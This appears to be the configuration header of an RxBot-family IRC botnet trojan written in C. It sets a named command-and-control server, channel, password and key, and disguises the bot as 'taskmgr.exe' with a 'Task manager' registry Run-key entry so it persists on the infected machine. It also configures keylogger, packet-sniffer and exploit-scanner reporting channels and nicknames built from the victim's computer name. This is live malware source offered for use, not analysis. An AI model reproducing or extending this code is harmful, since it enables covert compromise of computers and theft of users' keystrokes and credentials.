unsigned short port = 6667;				// first server port
unsigned short port2 = 7000;			// sec server port
unsigned short socks4port = 12221;		// socks port
unsigned short tftpport = 69;			// ftp port
unsigned short httpport = 2001;			// http server port
unsigned short rloginport = 513;		// rlogin server port
BOOL topiccmd = TRUE;			// enable topic commands
BOOL rndfilename = FALSE;		// random file name for bot file name
BOOL AutoStart = TRUE;			// auto start " sure "
char prefix = '.';				// ! . @ # $ % ^ & * ( ) _ + = \ | . choice prefix
int maxrand = 3;				// numbers in bots nicknames
int nicktype = CONSTNICK;		// type of nick names
/*
====================== choice types of nick names ======================

CONSTNICK = using nickname u choiced in nickconst line Ex: MP-54784
OSNICK = using OS Version in nick name Ex: XP-12345
LETTERNICK = using letter words with bot nickname Ex: rfsdg
LETNUMNICK = using letter words with numbers Ex: dkhmv-51354
COMPNICK = using victim computer name in nickname Himmler
COUNTRYNICK = using the Bot country name in nickname Ex: Kwt-54125
REALNICK = using real nick names from " nicklist.h " file
=======================================================================
*/
BOOL nickprefix = FALSE;	// using random char with bot nicknames

#ifdef DEBUG_LOGGING
char logfile[]="c:\\debug.txt";
#endif

#ifndef NO_CRYPT // crypt info
// 

#else  // recommended info

char botid[] = "Mp";		    		// ur bot ID
char version[] = "[RxBot]";      	// version name
char password[] = "Manair";			// bot password
char server[] = "abo3zbi.dynu.net";		// ur Bot Server
char serverpass[] = "";					// Server password
char channel[] = "#Manair";			// bot channel
char chanpass[] = "KSA";				// channel key
char server2[] = "abo3zbi.dynu.net";		// sec Server
char channel2[] = "#Manair";			// sec Channel
char chanpass2[] = "KSA";			// sec key
char filename[] = "taskmgr.exe";		// bot file name in victim P.C
char keylogfile[] = "Logz.txt";			// keyloger file name
char valuename[] = "Task manager";		// registry key name of the bot
char nickconst[] = "cx-";				// Bot Prefix Nickname
char szLocalPayloadFile[]="msconfig.dat";	//  PayLoad File Name
char modeonconn[] = "-x+i";				// bot mode on connecting
char chanmode[] = "+sntp";				// channel mode if bot is op in #Channel
char exploitchan[] = "#Manair";		// Scanner Info Channel
char keylogchan[] = "#Manair";			// Keyloger Info Channel
char psniffchan[] = "#Manair";			// Sniffer Info Channel

// if you don`t have a Host.Name leav it on *@*
// if have a Host.Name type it Ex: *YourHost.Net
char *authost[] = {
	"*Manair@*",		// Your Host Name
};

char *versionlist[] = {
	"mIRC v6.03 Khaled Mardam-Bey",
	"mIRC v6.10 Khaled Mardam-Bey",
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.14 Khaled Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "QRXxs.cqMuu1q/Gew17wtxu."; // Pre !!! ide encryp irtam hogy citromhej de sztem igy nemleszjo
#endif
